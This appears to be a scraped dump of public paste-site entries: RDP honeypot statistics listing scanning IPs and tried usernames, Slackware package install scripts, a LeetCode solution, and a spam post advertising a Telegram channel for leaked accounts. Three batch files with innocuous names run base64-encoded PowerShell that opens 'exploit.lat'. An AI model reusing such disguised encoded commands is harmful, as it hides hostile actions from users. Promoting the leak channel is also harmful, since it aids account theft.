id,title,username,language,date,content
TykUkKrJ,2025-06-07_stats.json,rdp_snitch,JSON,Saturday 7th of June 2025 07:18:29 PM CDT,"{
  ""ip"": {
    ""167.172.131.118"": 8514,
    ""143.198.221.164"": 456,
    ""103.56.5.14"": 267,
    ""62.3.42.167"": 6,
    ""45.227.254.130"": 9,
    ""91.238.181.91"": 6,
    ""147.185.132.158"": 12,
    ""45.227.254.152"": 6,
    ""80.94.95.203"": 9,
    ""205.210.31.200"": 9,
    ""47.120.47.93"": 3,
    ""193.142.146.227"": 9,
    ""92.63.197.23"": 9,
    ""129.227.230.73"": 3,
    ""172.184.144.136"": 6,
    ""91.202.233.4"": 12,
    ""198.235.24.236"": 9,
    ""152.42.212.148"": 7077,
    ""104.236.244.191"": 9,
    ""165.232.170.129"": 41703,
    ""128.199.168.88"": 4998,
    ""198.235.24.233"": 9,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""167.99.236.65"": 15,
    ""147.185.132.61"": 9,
    ""47.236.157.151"": 3
  },
  ""asn"": {
    ""AS14061"": 62772,
    ""AS140599"": 267,
    ""AS61173"": 6,
    ""AS267784"": 15,
    ""AS49434"": 12,
    ""AS396982"": 48,
    ""AS204428"": 9,
    ""AS37963"": 3,
    ""AS213438"": 9,
    ""AS210848"": 9,
    ""AS21859"": 3,
    ""AS8075"": 6,
    ""AS200593"": 12,
    ""AS35042"": 6,
    ""AS45102"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 62772,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Flyservers S.A."": 15,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 48,
    ""SS-Net"": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""ColocaTel Inc."": 9,
    ""Telkom Internet LTD"": 9,
    ""Zenlayer Inc"": 3,
    ""Microsoft"": 6,
    ""Prospero OOO"": 12,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 62757,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Palo Alto Networks, Inc"": 48,
    ""Unmanaged LTD"": 9,
    ""Alibaba.com LLC"": 6,
    ""ColocaTel Inc"": 9,
    ""Korotkij Denis Aleksandrovich"": 9,
    ""NetProtect LLC"": 3,
    ""Microsoft Azure Cloud (westus)"": 6,
    ""Prospero OOO"": 12,
    ""Digital Ocean"": 15
  },
  ""regionName"": {
    ""New Jersey"": 8538,
    ""South West"": 54234,
    ""Metro Manila"": 267,
    ""Razavi Khorasan"": 6,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 12,
    ""California"": 54,
    ""Budapest"": 9,
    ""Guangdong"": 3,
    ""North Holland"": 18,
    ""Bangkok"": 3,
    ""Ashgabat"": 12,
    ""Kowloon City"": 6,
    ""North West"": 3
  },
  ""country"": {
    ""United States"": 8592,
    ""Singapore"": 54237,
    ""Philippines"": 267,
    ""Iran"": 6,
    ""Lithuania"": 15,
    ""France"": 12,
    ""Hungary"": 9,
    ""China"": 3,
    ""The Netherlands"": 18,
    ""Thailand"": 3,
    ""Turkmenistan"": 12,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 63057,
    ""Domain"": 18,
    ""Test"": 27,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Administr"": 30,
    ""dRMIARzYe"": 3,
    ""ZzDQaL"": 3,
    ""TYPoLW"": 3,
    ""PVSCsdRvF"": 3,
    ""wVhDlN"": 3,
    ""SoFYtc"": 3,
    ""dFAyiNgDf"": 3,
    ""NRWHgv"": 3,
    ""hxudXJ"": 3,
    ""HgZvDBanI"": 3,
    ""TGZddU"": 3,
    ""VKzioF"": 3
  },
  ""keyboard"": {
    ""Unknown"": 63180
  },
  ""client_build"": {
    ""Unknown"": 63180
  },
  ""client_name"": {
    ""Unknown"": 63180
  },
  ""ip_type"": {
    ""hosting"": 62850,
    ""Unknown"": 327,
    ""mobile & hosting & proxy"": 3
  }
}"
zNDPvDcp,✅ Free Cash Leaks AW,mraimbot,JavaScript,Saturday 7th of June 2025 07:17:40 PM CDT,"
We just posted fresh leaks.
 
Join the channel: https://t.me/LucasLEAK
 
Accounts: #VSs0j4wSzn

"
tejE7yDu,2025-06-07_stats.json,rdp_snitch,JSON,Saturday 7th of June 2025 07:16:11 PM CDT,"{
  ""ip"": {
    ""167.172.131.118"": 5676,
    ""143.198.221.164"": 304,
    ""103.56.5.14"": 178,
    ""62.3.42.167"": 4,
    ""45.227.254.130"": 6,
    ""91.238.181.91"": 4,
    ""147.185.132.158"": 8,
    ""45.227.254.152"": 4,
    ""80.94.95.203"": 6,
    ""205.210.31.200"": 6,
    ""47.120.47.93"": 2,
    ""193.142.146.227"": 6,
    ""92.63.197.23"": 6,
    ""129.227.230.73"": 2,
    ""172.184.144.136"": 4,
    ""91.202.233.4"": 8,
    ""198.235.24.236"": 6,
    ""152.42.212.148"": 4718,
    ""104.236.244.191"": 6,
    ""165.232.170.129"": 27802,
    ""128.199.168.88"": 3332,
    ""198.235.24.233"": 6,
    ""88.214.25.121"": 4,
    ""91.238.181.94"": 4,
    ""167.99.236.65"": 10,
    ""147.185.132.61"": 6,
    ""47.236.157.151"": 2
  },
  ""asn"": {
    ""AS14061"": 41848,
    ""AS140599"": 178,
    ""AS61173"": 4,
    ""AS267784"": 10,
    ""AS49434"": 8,
    ""AS396982"": 32,
    ""AS204428"": 6,
    ""AS37963"": 2,
    ""AS213438"": 6,
    ""AS210848"": 6,
    ""AS21859"": 2,
    ""AS8075"": 4,
    ""AS200593"": 8,
    ""AS35042"": 4,
    ""AS45102"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 41848,
    ""Comfac Corporation"": 178,
    ""Green Web Samaneh Novin PJSC"": 4,
    ""Flyservers S.A."": 10,
    ""Datacenter location PAR1 France"": 8,
    ""Google LLC"": 32,
    ""SS-Net"": 6,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 2,
    ""ColocaTel Inc."": 6,
    ""Telkom Internet LTD"": 6,
    ""Zenlayer Inc"": 2,
    ""Microsoft"": 4,
    ""Prospero OOO"": 8,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Alibaba (US) Technology Co., Ltd."": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 41838,
    ""Comfac Corporation"": 178,
    ""Green Web Samaneh Novin PJSC"": 4,
    ""Xwin Universal LTD"": 10,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Palo Alto Networks, Inc"": 32,
    ""Unmanaged LTD"": 6,
    ""Alibaba.com LLC"": 4,
    ""ColocaTel Inc"": 6,
    ""Korotkij Denis Aleksandrovich"": 6,
    ""NetProtect LLC"": 2,
    ""Microsoft Azure Cloud (westus)"": 4,
    ""Prospero OOO"": 8,
    ""Digital Ocean"": 10
  },
  ""regionName"": {
    ""New Jersey"": 5692,
    ""South West"": 36156,
    ""Metro Manila"": 178,
    ""Razavi Khorasan"": 4,
    ""Vilnius"": 10,
    ""\u00cele-de-France"": 8,
    ""California"": 36,
    ""Budapest"": 6,
    ""Guangdong"": 2,
    ""North Holland"": 12,
    ""Bangkok"": 2,
    ""Ashgabat"": 8,
    ""Kowloon City"": 4,
    ""North West"": 2
  },
  ""country"": {
    ""United States"": 5728,
    ""Singapore"": 36158,
    ""Philippines"": 178,
    ""Iran"": 4,
    ""Lithuania"": 10,
    ""France"": 8,
    ""Hungary"": 6,
    ""China"": 2,
    ""The Netherlands"": 12,
    ""Thailand"": 2,
    ""Turkmenistan"": 8,
    ""Hong Kong"": 4
  },
  ""account"": {
    ""hello"": 42038,
    ""Domain"": 12,
    ""Test"": 18,
    ""yhDxyQONx"": 4,
    ""nmap"": 2,
    ""naap"": 2,
    ""Administr"": 20,
    ""dRMIARzYe"": 2,
    ""ZzDQaL"": 2,
    ""TYPoLW"": 2,
    ""PVSCsdRvF"": 2,
    ""wVhDlN"": 2,
    ""SoFYtc"": 2,
    ""dFAyiNgDf"": 2,
    ""NRWHgv"": 2,
    ""hxudXJ"": 2,
    ""HgZvDBanI"": 2,
    ""TGZddU"": 2,
    ""VKzioF"": 2
  },
  ""keyboard"": {
    ""Unknown"": 42120
  },
  ""client_build"": {
    ""Unknown"": 42120
  },
  ""client_name"": {
    ""Unknown"": 42120
  },
  ""ip_type"": {
    ""hosting"": 41900,
    ""Unknown"": 218,
    ""mobile & hosting & proxy"": 2
  }
}"
QiyZp6PK,2025-06-07_stats.json,rdp_snitch,JSON,Saturday 7th of June 2025 07:15:12 PM CDT,"{
  ""ip"": {
    ""167.172.131.118"": 2838,
    ""143.198.221.164"": 152,
    ""103.56.5.14"": 89,
    ""62.3.42.167"": 2,
    ""45.227.254.130"": 3,
    ""91.238.181.91"": 2,
    ""147.185.132.158"": 4,
    ""45.227.254.152"": 2,
    ""80.94.95.203"": 3,
    ""205.210.31.200"": 3,
    ""47.120.47.93"": 1,
    ""193.142.146.227"": 3,
    ""92.63.197.23"": 3,
    ""129.227.230.73"": 1,
    ""172.184.144.136"": 2,
    ""91.202.233.4"": 4,
    ""198.235.24.236"": 3,
    ""152.42.212.148"": 2359,
    ""104.236.244.191"": 3,
    ""165.232.170.129"": 13901,
    ""128.199.168.88"": 1666,
    ""198.235.24.233"": 3,
    ""88.214.25.121"": 2,
    ""91.238.181.94"": 2,
    ""167.99.236.65"": 5,
    ""147.185.132.61"": 3,
    ""47.236.157.151"": 1
  },
  ""asn"": {
    ""AS14061"": 20924,
    ""AS140599"": 89,
    ""AS61173"": 2,
    ""AS267784"": 5,
    ""AS49434"": 4,
    ""AS396982"": 16,
    ""AS204428"": 3,
    ""AS37963"": 1,
    ""AS213438"": 3,
    ""AS210848"": 3,
    ""AS21859"": 1,
    ""AS8075"": 2,
    ""AS200593"": 4,
    ""AS35042"": 2,
    ""AS45102"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 20924,
    ""Comfac Corporation"": 89,
    ""Green Web Samaneh Novin PJSC"": 2,
    ""Flyservers S.A."": 5,
    ""Datacenter location PAR1 France"": 4,
    ""Google LLC"": 16,
    ""SS-Net"": 3,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 1,
    ""ColocaTel Inc."": 3,
    ""Telkom Internet LTD"": 3,
    ""Zenlayer Inc"": 1,
    ""Microsoft"": 2,
    ""Prospero OOO"": 4,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Alibaba (US) Technology Co., Ltd."": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 20919,
    ""Comfac Corporation"": 89,
    ""Green Web Samaneh Novin PJSC"": 2,
    ""Xwin Universal LTD"": 5,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Palo Alto Networks, Inc"": 16,
    ""Unmanaged LTD"": 3,
    ""Alibaba.com LLC"": 2,
    ""ColocaTel Inc"": 3,
    ""Korotkij Denis Aleksandrovich"": 3,
    ""NetProtect LLC"": 1,
    ""Microsoft Azure Cloud (westus)"": 2,
    ""Prospero OOO"": 4,
    ""Digital Ocean"": 5
  },
  ""regionName"": {
    ""New Jersey"": 2846,
    ""South West"": 18078,
    ""Metro Manila"": 89,
    ""Razavi Khorasan"": 2,
    ""Vilnius"": 5,
    ""\u00cele-de-France"": 4,
    ""California"": 18,
    ""Budapest"": 3,
    ""Guangdong"": 1,
    ""North Holland"": 6,
    ""Bangkok"": 1,
    ""Ashgabat"": 4,
    ""Kowloon City"": 2,
    ""North West"": 1
  },
  ""country"": {
    ""United States"": 2864,
    ""Singapore"": 18079,
    ""Philippines"": 89,
    ""Iran"": 2,
    ""Lithuania"": 5,
    ""France"": 4,
    ""Hungary"": 3,
    ""China"": 1,
    ""The Netherlands"": 6,
    ""Thailand"": 1,
    ""Turkmenistan"": 4,
    ""Hong Kong"": 2
  },
  ""account"": {
    ""hello"": 21019,
    ""Domain"": 6,
    ""Test"": 9,
    ""yhDxyQONx"": 2,
    ""nmap"": 1,
    ""naap"": 1,
    ""Administr"": 10,
    ""dRMIARzYe"": 1,
    ""ZzDQaL"": 1,
    ""TYPoLW"": 1,
    ""PVSCsdRvF"": 1,
    ""wVhDlN"": 1,
    ""SoFYtc"": 1,
    ""dFAyiNgDf"": 1,
    ""NRWHgv"": 1,
    ""hxudXJ"": 1,
    ""HgZvDBanI"": 1,
    ""TGZddU"": 1,
    ""VKzioF"": 1
  },
  ""keyboard"": {
    ""Unknown"": 21060
  },
  ""client_build"": {
    ""Unknown"": 21060
  },
  ""client_name"": {
    ""Unknown"": 21060
  },
  ""ip_type"": {
    ""hosting"": 20950,
    ""Unknown"": 109,
    ""mobile & hosting & proxy"": 1
  }
}"
XEFdaVwN,install p7zip,jcofer555,Bash,Saturday 7th of June 2025 06:28:24 PM CDT,"#!/bin/bash

# Ensure extra folder on flash drive exists
echo ""Checking if extra exists on the flash drive""
if [ -d ""/boot/extra"" ]; then
    echo ""Extra folder already exists on the flash drive""
else
    echo ""Extra folder does not exist, Attempting to create it on the flash drive""
    if mkdir -p ""/boot/extra""; then
        echo ""Successfully created the extra folder on the flash drive""
    else
        echo ""Failed to create the extra folder on the flash drive""
        exit 1
    fi
fi

# Function to download a package if it doesn't already exist
download_package() {
    local pkg_name=$1
    local pkg_url=$2
    local pkg_path=""/boot/extra/$pkg_name""

    if [ -f ""$pkg_path"" ]; then
        echo ""Package $pkg_name already exists in /boot/extra/, skipping download""
    else
        echo ""Downloading $pkg_name...""
        if wget -q -O ""$pkg_path"" ""$pkg_url""; then
            echo ""Successfully downloaded $pkg_name to the flash drive extra folder""
        else
            echo ""Failed to download $pkg_name from $pkg_url""
            return 1
        fi
    fi
}

# Function to install a package after verifying it exists
install_package() {
    local pkg_name=$1
    local pkg_url=$2
    local pkg_path=""/boot/extra/$pkg_name""
    local check_cmd=$3

    # Ensure the package exists before checking installation status
    if [ -f ""$pkg_path"" ]; then
        echo ""Package $pkg_name already exists in /boot/extra/""
    else
        echo ""Package $pkg_name not found in /boot/extra/, attempting to download""
        if ! download_package ""$pkg_name"" ""$pkg_url""; then
            echo ""Failed to retrieve $pkg_name, aborting installation.""
            return 1
        fi
    fi

    # Check if package is already installed before proceeding
    if eval ""$check_cmd""; then
        echo ""$pkg_name is already installed, skipping installation""
        return 0
    fi

    # Attempt installation
    echo ""Installing $pkg_name...""
    if installpkg ""$pkg_path"" >/dev/null 2>&1; then
        echo ""$pkg_name has been successfully installed!""
    else
        echo ""Failed to install $pkg_name""
        return 1
    fi
}

# Define package variables
pkg_name=""p7zip-17.05-x86_64-3cf.txz""
pkg_url=""https://slackers.it/repository/slackware64-current/p7zip/$pkg_name""
pkg_path=""/boot/extra/$pkg_name""
pkg_check=""command -v 7z >/dev/null 2>&1""

# Install p7zip if missing
install_package ""$pkg_name"" ""$pkg_url"" ""$pkg_check"""
ywsZmFLH,install jdupes,jcofer555,Bash,Saturday 7th of June 2025 06:27:28 PM CDT,"#!/bin/bash

# Ensure extra folder on flash drive exists
echo ""Checking if extra exists on the flash drive""
if [ -d ""/boot/extra"" ]; then
    echo ""Extra folder already exists on the flash drive""
else
    echo ""Extra folder does not exist, Attempting to create it on the flash drive""
    if mkdir -p ""/boot/extra""; then
        echo ""Successfully created the extra folder on the flash drive""
    else
        echo ""Failed to create the extra folder on the flash drive""
        exit 1
    fi
fi

# Function to download a package if it doesn't already exist
download_package() {
    local pkg_name=$1
    local pkg_url=$2
    local pkg_path=""/boot/extra/$pkg_name""

    if [ -f ""$pkg_path"" ]; then
        echo ""Package $pkg_name already exists in /boot/extra/, skipping download""
    else
        echo ""Downloading $pkg_name""
        if wget -q -O ""$pkg_path"" ""$pkg_url""; then
            echo ""Successfully downloaded $pkg_name to the flash drive extra folder""
        else
            echo ""Failed to download $pkg_name from $pkg_url""
            return 1
        fi
    fi
}

# Function to install a package after verifying it exists and format is correct
install_package() {
    local pkg_name=$1
    local pkg_url=$2
    local pkg_path=""/boot/extra/$pkg_name""
    local check_cmd=$3

    # Ensure the package exists before checking installation status
    if [ -f ""$pkg_path"" ]; then
        echo ""Package $pkg_name already exists in /boot/extra""
    else
        echo ""Package $pkg_name not found in /boot/extra/, attempting to download""
        if ! download_package ""$pkg_name"" ""$pkg_url""; then
            echo ""Failed to retrieve $pkg_name, aborting installation""
            return 1
        fi
    fi

    # Check if the file is empty. If empty delete it and redownload
    if [ ! -s ""$pkg_path"" ]; then
        echo ""Error: $pkg_name exists but is empty. Deleting and redownloading""
        rm -f ""$pkg_path""
        if ! download_package ""$pkg_name"" ""$pkg_url""; then
            echo ""Failed to re-download $pkg_name, aborting installation""
            return 1
        fi
    else
        echo ""Package $pkg_name is valid""
    fi

    # Verify the package format. If incorrect format delete it and redownload
    if file ""$pkg_path"" | grep -q 'XZ compressed data\|gzip compressed data'; then
        echo ""Package $pkg_name format is correct.""
    else
        echo ""Error: $pkg_name does not appear to be a valid Slackware package. Deleting and redownloading""
        rm -f ""$pkg_path""
        if ! download_package ""$pkg_name"" ""$pkg_url""; then
            echo ""Failed to re-download $pkg_name, aborting installation""
            return 1
        fi
    fi

    # Check if package is already installed before proceeding
    if eval ""$check_cmd""; then
        echo ""$pkg_name is already installed, skipping installation""
        return 0
    fi

    # Attempt installation
    echo ""Installing $pkg_name...""
    if installpkg ""$pkg_path"" >/dev/null 2>&1; then
        echo ""$pkg_name has been successfully installed""
    else
        echo ""Failed to install $pkg_name""
        return 1
    fi
}

# Define package variables
libjody_pkg=""libjodycode-3.1.1-x86_64-2_SBo.tgz""
libjody_url=""https://github.com/shinji257/unraid_pkgs/raw/refs/heads/main/slackware64-current/libjodycode/libjodycode-3.1.1-x86_64-2_SBo.tgz""
libjody_check=""ldconfig -p | grep -q libjodycode.so.3""

jdupes_pkg=""jdupes-1.28.0-x86_64-2_SBo.tgz""
jdupes_url=""https://raw.githubusercontent.com/shinji257/unraid_pkgs/refs/heads/main/slackware64-current/jdupes/jdupes-1.28.0-x86_64-2_SBo.tgz""
jdupes_check=""which jdupes >/dev/null 2>&1""

# Install libjodycode if missing
install_package ""$libjody_pkg"" ""$libjody_url"" ""$libjody_check""

# Install jdupes if missing
install_package ""$jdupes_pkg"" ""$jdupes_url"" ""$jdupes_check"""
M4SML2ud,enable_feature.bat,neolino,Batch,Saturday 7th of June 2025 06:05:43 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYwA5ADQAZAAyAGUAZQBiAA==

qa6OlB"
DCxjjkj7,terminate_process.cmd,johsn2010,Batch,Saturday 7th of June 2025 06:05:40 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMgA3AGEANAA5AGQAYwA2AA==

VjSPJc"
tRefnh1A,LeetCode 46. Permutations,AmbushedRaccoon,C++,Saturday 7th of June 2025 05:59:31 PM CDT,"class Solution46 {
public:
    std::vector<std::vector<int>> permute(std::vector<int> nums)
    {
        std::vector<std::vector<int>> result;
        
        std::sort(nums.begin(), nums.end());
        int swapIndex;
        do
        {
            swapIndex = -1;
            result.push_back(nums);
            for (int i = nums.size() - 2; i >= 0; --i)
            {
                if (nums[i] < nums[i + 1])
                {
                    swapIndex = i;
                    break;
                }
            }
            if (swapIndex != -1)
            {
                for (int i = nums.size() - 1; i >= 0; --i)
                {
                    if (nums[i] > nums[swapIndex])
                    {
                        std::swap(nums[i], nums[swapIndex]);
                        break;
                    }
                }
                std::reverse(nums.begin() + swapIndex + 1, nums.end());
            }
        } while (swapIndex != -1);
        return result;
    }
};"
iFyd5L6w,sync_time.cmd,neolino,Batch,Saturday 7th of June 2025 05:55:42 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AZgBhAGUANQAwADgAOQA4AA==

iPkoTx"
